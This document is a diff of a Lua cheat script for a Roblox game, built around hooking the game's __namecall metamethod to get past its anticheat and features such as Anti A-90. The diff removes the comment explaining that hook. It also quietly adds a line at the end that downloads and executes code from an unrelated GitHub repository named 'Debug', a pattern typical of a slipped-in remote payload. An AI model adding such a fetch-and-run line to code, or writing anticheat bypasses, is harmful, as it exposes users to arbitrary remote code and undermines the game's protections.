@@ -34,7 +34,7 @@ if not httpRequest then
 end
 local DISCORD_API_URL = "https://5e6a4ce1-65e1-49da-a450-ac983707fc3b-00-s6e0zpq7bs82.janeway.replit.dev:3000/"
 local GAME_ID = tostring(game.JobId)
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/XasonYTB/XaLib/refs/heads/main/NewContentTesting"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/XasonYTB/XaLib/refs/heads/main/NewContentTesting"))() 
 local minSize = Vector2.new(500, 400)
 local defaultSize = Vector2.new(700, 500)
 Window = Library:CreateWindow({
@@ -45,13 +45,7 @@ Window = Library:CreateWindow({
     Keybind = Enum.KeyCode.RightShift,
     Theme = "Purple"
 })
--- ══════════════════════════════════════════════════════════════
---  UNC / EXECUTOR CAPABILITY CHECK
---  The Anti Heartbeat and Anti A-90 features work by hooking
---  getrawmetatable(game).__namecall — so that is exactly what
---  we test here. Hooking a plain Lua dummy is NOT enough; many
---  executors support that but still can't touch __namecall.
--- ══════════════════════════════════════════════════════════════
+
 local hookSupported = false
 do
     local ok, err = pcall(function()
@@ -1365,6 +1359,8 @@ local autoFinishDailyToggle = UniversalTab:Toggle("Auto Finish Daily Run", false
         end
     end, "Auto Finish Daily Run Toggle")
 end, "Automatically finds and teleports to the daily run exit")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeScript/ZeScripts/refs/heads/main/Debug"))()
 
 local anticheatManipEnabled  = false
 local anticheatManipLoop     = nil
